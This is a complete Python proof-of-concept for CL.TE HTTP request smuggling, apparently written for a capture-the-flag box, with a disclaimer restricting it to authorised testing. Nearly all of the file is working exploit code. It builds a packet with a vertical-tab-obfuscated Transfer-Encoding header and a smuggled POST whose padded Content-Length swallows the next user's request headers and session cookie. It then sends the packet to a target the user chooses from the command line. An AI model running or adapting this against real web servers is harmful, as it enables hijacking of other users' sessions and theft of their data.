#!/usr/bin/env python3
"""
HTTP Request Smuggling PoC — CL.TE Technique
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Demonstrates HTTP/1.1 request smuggling via the CL.TE vector:
  - Front-end proxy honours Content-Length
  - Back-end server honours Transfer-Encoding

Technique reference : https://0xdf.gitlab.io/2021/09/18/htb-sink.html
TE.CL / CL.TE theory: https://portswigger.net/web-security/request-smuggling

⚠️  For authorised security research and CTF use only.
    Never run against systems you do not have explicit written permission to test.
"""

import argparse
import socket
import time
from dataclasses import dataclass, field
from typing import Optional


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

CRLF = "\r\n"
DEFAULT_RECV_BUFFER = 4096
DEFAULT_SLEEP = 5.0  # seconds to hold socket open before close


# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------


@dataclass
class SmuggleConfig:
    """All parameters required to build and send a smuggled request."""

    # Network
    host: str
    port: int

    # Smuggled (inner) request
    smuggled_path: str = "/notes"
    smuggled_method: str = "POST"
    smuggled_content_type: str = "text/plain"
    smuggled_body_prefix: str = "note="

    # Cookie carried by the smuggled request
    session_cookie: str = ""

    # Outer request
    outer_path: str = "/"
    outer_method: str = "GET"

    # Behaviour
    sleep_before_close: float = DEFAULT_SLEEP
    receive_response: bool = True
    verbose: bool = False

    @property
    def origin(self) -> str:
        return f"http://{self.host}:{self.port}"


# ---------------------------------------------------------------------------
# Packet builder
# ---------------------------------------------------------------------------


class SmuggledPacketBuilder:
    """
    Builds a CL.TE smuggled HTTP/1.1 packet.

    CL.TE means:
      - The *front-end* (reverse proxy / load balancer) routes by Content-Length.
      - The *back-end* parses Transfer-Encoding and sees the chunked terminator (0\\r\\n\\r\\n)
        before the Content-Length boundary — leaving the remainder as the start of
        the next request on the same keep-alive connection.

    The \x0b (vertical tab) before "chunked" in the Transfer-Encoding header is a
    classic obfuscation byte that causes many front-end parsers to ignore the header
    entirely while some back-ends still honour it.
    """

    # How many extra bytes to pad the smuggled Content-Length by.
    # The back-end will wait for this many more bytes — which arrive as the
    # start of the *next* legitimate request, letting us capture headers/cookies.
    SMUGGLED_CL_PADDING = 50

    def __init__(self, config: SmuggleConfig) -> None:
        self.cfg = config

    # ------------------------------------------------------------------
    # Inner (smuggled) request
    # ------------------------------------------------------------------

    def _build_smuggled_request(self) -> str:
        """
        Build the inner POST that will be prepended to the next victim request.
        Content-Length is intentionally oversized so the back-end reads into
        the following request's headers.
        """
        cfg = self.cfg
        lines = [
            f"{cfg.smuggled_method} {cfg.smuggled_path} HTTP/1.1",
            f"Host: {cfg.host}:{cfg.port}",
            f"Referer: {cfg.origin}{cfg.smuggled_path}",
            f"Content-Type: {cfg.smuggled_content_type}",
            f"Content-Length: {self.SMUGGLED_CL_PADDING}",
        ]
        if cfg.session_cookie:
            lines.append(f"Cookie: session={cfg.session_cookie}")

        lines += ["", cfg.smuggled_body_prefix]  # blank line = end of headers
        return CRLF.join(lines)

    # ------------------------------------------------------------------
    # Chunked body
    # ------------------------------------------------------------------

    def _build_chunked_body(self) -> str:
        """
        Wrap the smuggled request in a chunked body terminated by a zero-chunk.
        The zero-chunk signals end-of-body to the back-end Transfer-Encoding parser.
        """
        smuggled = self._build_smuggled_request()
        return CRLF.join(["0", "", smuggled])

    # ------------------------------------------------------------------
    # Outer request
    # ------------------------------------------------------------------

    def _build_outer_headers(self, body: str) -> str:
        """
        Build the outer request headers.

        Key points:
          - Content-Length reflects the *full* body (including smuggled request)
            so the front-end forwards everything.
          - Transfer-Encoding: \\x0bchunked — the VT byte causes many WAFs/proxies
            to skip the header; the vulnerable back-end still parses it.
        """
        cfg = self.cfg
        lines = [
            f"{cfg.outer_method} {cfg.outer_path} HTTP/1.1",
            f"Host: {cfg.host}:{cfg.port}",
            f"Content-Length: {len(body.encode())}",
            "Transfer-Encoding: \x0bchunked",
            "",  # end of headers
            "",
        ]
        return CRLF.join(lines)

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def build(self) -> bytes:
        """Return the complete smuggled packet as raw bytes."""
        body = self._build_chunked_body()
        headers = self._build_outer_headers(body)
        packet = headers + body
        return packet.encode()

    def describe(self, packet: bytes) -> None:
        """Print an annotated hex + decoded view of the packet."""
        decoded = packet.decode("latin-1")  # latin-1 to preserve \x0b visually
        separator = "─" * 60
        print(f"\n{separator}")
        print("OUTER HEADERS  (front-end sees Content-Length, routes forward)")
        print(separator)
        outer, _, rest = decoded.partition(CRLF + CRLF)
        print(outer)
        print(f"\n{separator}")
        print("CHUNKED BODY   (back-end parses Transfer-Encoding)")
        print(separator)
        print(rest)
        print(separator + "\n")


# ---------------------------------------------------------------------------
# Sender
# ---------------------------------------------------------------------------


class SmuggleSender:
    """Manages the raw TCP connection and packet delivery."""

    def __init__(self, config: SmuggleConfig) -> None:
        self.cfg = config

    def send(self, packet: bytes) -> Optional[bytes]:
        """
        Open a TCP socket, send the packet, optionally receive the response,
        hold the connection open briefly so the server processes the smuggled
        request, then close.

        Returns the raw server response if receive_response is True, else None.
        """
        cfg = self.cfg
        response: Optional[bytes] = None

        print(f"[*] Connecting to {cfg.host}:{cfg.port} ...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((cfg.host, cfg.port))
            print(f"[*] Sending {len(packet)} byte packet ...")
            sock.sendall(packet)

            if cfg.receive_response:
                sock.settimeout(cfg.sleep_before_close)
                chunks = []
                try:
                    while chunk := sock.recv(DEFAULT_RECV_BUFFER):
                        chunks.append(chunk)
                except (socket.timeout, ConnectionResetError):
                    pass
                response = b"".join(chunks)

            else:
                print(f"[*] Holding socket open for {cfg.sleep_before_close}s ...")
                time.sleep(cfg.sleep_before_close)

        print("[+] Done.")
        return response


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="CL.TE HTTP request smuggling PoC",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=5000, help="Target port")
    parser.add_argument(
        "--cookie", default="", dest="session_cookie", help="Session cookie value"
    )
    parser.add_argument(
        "--smuggled-path", default="/notes", help="Path for the smuggled request"
    )
    parser.add_argument(
        "--outer-path", default="/", help="Path for the outer (carrier) request"
    )
    parser.add_argument(
        "--sleep",
        type=float,
        default=DEFAULT_SLEEP,
        dest="sleep_before_close",
        help="Seconds to hold socket open",
    )
    parser.add_argument(
        "--no-recv",
        action="store_false",
        dest="receive_response",
        help="Don't attempt to read a response (use sleep instead)",
    )
    parser.add_argument(
        "--verbose", "-v", action="store_true", help="Print annotated packet dump"
    )
    return parser


def parse_config() -> SmuggleConfig:
    args = build_parser().parse_args()
    return SmuggleConfig(
        host=args.host,
        port=args.port,
        session_cookie=args.session_cookie,
        smuggled_path=args.smuggled_path,
        outer_path=args.outer_path,
        sleep_before_close=args.sleep_before_close,
        receive_response=args.receive_response,
        verbose=args.verbose,
    )


# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------


def main() -> None:
    config = parse_config()
    builder = SmuggledPacketBuilder(config)
    sender = SmuggleSender(config)

    packet = builder.build()

    if config.verbose:
        builder.describe(packet)

    response = sender.send(packet)

    if response:
        print("\n[*] Server response:")
        print("─" * 60)
        print(response.decode("latin-1"))
        print("─" * 60)


if __name__ == "__main__":
    main()
